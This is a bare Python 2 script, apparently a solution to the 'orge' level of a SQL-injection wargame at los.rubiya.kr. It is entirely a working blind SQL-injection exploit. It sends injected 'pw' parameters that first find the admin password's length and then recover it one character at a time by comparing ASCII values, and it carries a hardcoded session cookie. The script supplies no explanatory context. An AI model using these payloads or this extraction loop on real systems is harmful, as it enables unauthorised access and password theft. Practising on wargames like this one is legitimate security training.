import requests
cooki = {'PHPSESSID': "60n14boast8mdim3p13n5kmij6"}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
i = 1
key = "Hello admin"
pw_len = 0
while True:
    params = {'pw': "'||length(pw)="+str(i)+'#'}
    res = requests.get(url, params, cookies=cooki)
    print res.text
    if key in res.text:
        pw_len = i
        break
    i = i + 1
    print i
print pw_len
for j in range(1,pw_len+1):
    for k in range(48, 123):
        if 58 <= k < 65:
            continue
        if 91 <= k < 97:
            continue
        params = {'pw': "1' || id='admin' && ascii(substr(pw,"+str(j)+",1)) = "+str(hex(k))+"#"}
        res2 = requests.get(url, params, cookies=cooki)

        if key in res2.text:
            print str(j) + " : " + chr(k)
